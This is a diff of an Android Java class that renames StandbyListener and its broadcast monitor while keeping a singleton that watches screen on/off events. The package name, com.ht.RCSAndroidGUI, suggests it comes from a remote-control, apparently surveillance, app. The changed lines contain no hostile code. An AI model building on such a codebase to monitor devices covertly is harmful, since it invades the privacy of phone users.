@@ -6,25 +6,25 @@ import android.content.IntentFilter;
 import com.ht.RCSAndroidGUI.Standby;
 import com.ht.RCSAndroidGUI.Status;
 
-public class StandbyListener extends Listener<Standby> {
+public class ListenerStandby extends Listener<Standby> {
 		/** The Constant TAG. */
 		private static final String TAG = "StandbyListener";
 
-		private StandbyBroadcastMonitor standbyReceiver;
+		private BroadcastMonitorStandby standbyReceiver;
 
 		/** The singleton. */
-		private volatile static StandbyListener singleton;
+		private volatile static ListenerStandby singleton;
 
 		/**
 		 * Self.
 		 * 
 		 * @return the status
 		 */
-		public static StandbyListener self() {
+		public static ListenerStandby self() {
 			if (singleton == null) {
-				synchronized (StandbyListener.class) {
+				synchronized (ListenerStandby.class) {
 					if (singleton == null) {
-						singleton = new StandbyListener();
+						singleton = new ListenerStandby();
 					}
 				}
 			}
@@ -46,7 +46,7 @@ public class StandbyListener extends Listener<Standby> {
 		 * Register Power Connected/Disconnected.
 		 */
 		private void registerAc() {
-			standbyReceiver = new StandbyBroadcastMonitor();
+			standbyReceiver = new BroadcastMonitorStandby();
 			
 			final IntentFilter filterOn = new IntentFilter(Intent.ACTION_SCREEN_ON);
 			final IntentFilter filterOff = new IntentFilter(Intent.ACTION_SCREEN_OFF);
